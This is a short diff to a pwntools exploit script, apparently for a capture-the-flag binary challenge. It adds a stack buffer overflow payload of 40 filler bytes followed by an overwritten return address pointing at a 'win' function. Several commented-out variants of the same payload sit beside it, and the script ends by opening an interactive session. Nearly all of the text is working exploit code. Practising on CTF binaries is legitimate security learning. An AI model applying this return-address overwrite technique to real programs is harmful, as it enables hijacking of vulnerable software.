@@ -50,5 +50,14 @@ io = start()
 # log.success(flag)
 io.recvuntil(b"Please select from menu: ")
 io.sendline(b"1")
+# io.sendline(b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x1a\x05\xcbuvU\x00\x00")
+# payload = 'a' * (0x7fffffffdf30 - 0x7fffffffdf10 + 8 )
+# win = bytes.fromhex('55555555551a').decode('utf-8')
+# c = payload + win
+# print(c)
+io.sendline(b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x1aUUUUU\x00\x00")
+
+# writing = b"1\n" + b"a"*40 + struct.pack("<Q",0x55555555551a)
+# io.sendline(writing)
 io.interactive()
 
